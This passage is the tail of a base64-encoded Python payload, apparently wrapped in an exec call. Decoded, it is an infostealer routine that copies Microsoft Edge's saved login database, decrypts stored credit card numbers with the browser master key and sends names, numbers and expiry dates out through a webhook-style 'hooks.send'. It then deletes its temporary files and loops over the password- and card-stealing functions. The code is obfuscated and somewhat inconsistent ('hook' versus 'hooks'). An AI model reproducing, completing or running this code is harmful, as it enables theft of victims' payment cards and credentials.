gZToKICAgICAgICBwYXNzCgoKZGVmIGdldF9jcmVkaXRfY2FyZHMxKCk6CiAgICBtYXN0ZXJfa2V5ID0gZ2V0X21hc3Rlcl9rZXkoKQogICAgbG9naW5fZGIgPSBvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddICsgb3Muc2VwICsgXAogICAgICAgIHInQXBwRGF0YVxMb2NhbFxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcUHJvZmlsZSAxXExvZ2luIERhdGEnCiAgICB0cnk6CiAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLCAiQ0N2YXVsdC5kYiIpCiAgICBleGNlcHQ6CiAgICAgICAgaG9vay5zZW5kKCJlcnJvciwgTS5FIGlzbid0IGluc3RhbGxlZC4iKQogICAgICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoIkxvZ2ludmF1bHQuZGIiKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCJDQ3ZhdWx0LmRiIikKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCgogICAgdHJ5OgogICAgICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgKiBGUk9NIGNyZWRpdF9jYXJkcyIpCiAgICAgICAgZm9yIHIgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgIHVzZXJuYW1lID0gclsxXQogICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSByWzRdCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzd29yZCA9IGRlY3J5cHRfcGFzc3dvcmQoCiAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQsIG1hc3Rlcl9rZXkpCiAgICAgICAgICAgIGV4cGlyZV9tb24gPSByWzJdCiAgICAgICAgICAgIGV4cGlyZV95ZWFyID0gclszXQogICAgICAgICAgICBob29rcy5zZW5kKGYiQ0FSRC1OQU1FOiAiICsgdXNlcm5hbWUgKyAiXG5OVU1CRVI6ICIgKyBkZWNyeXB0ZWRfcGFzc3dvcmQgKyAiXG5FWFBJUlkgTTogIiArCiAgICAgICAgICAgICAgICAgICAgICAgc3RyKGV4cGlyZV9tb24pICsgIlxuRVhQSVJZIFk6ICIgKyBzdHIoZXhwaXJlX3llYXIpICsgIlxuIiArICIqIiAqIDEwICsgIlxuIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwoKICAgIGN1cnNvci5jbG9zZSgpCiAgICBjb25uLmNsb3NlKCkKICAgIHRyeToKICAgICAgICBvcy5yZW1vdmUoIkNDdmF1bHQuZGIiKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKCgp3aGlsZSBUcnVlOgogICAgZ2V0X3Bhc3N3b3JkKCkKICAgIGdldF9wYXNzd29yZDEoKQogICAgZ2V0X2NyZWRpdF9jYXJkcygpCiAgICBnZXRfY3JlZGl0X2NhcmRzMSgpCiAgICBvcy5yZW1vdmUoIkxvZ2ludmF1bHQuZGIiKSAKICAgIGJyZWFr'))
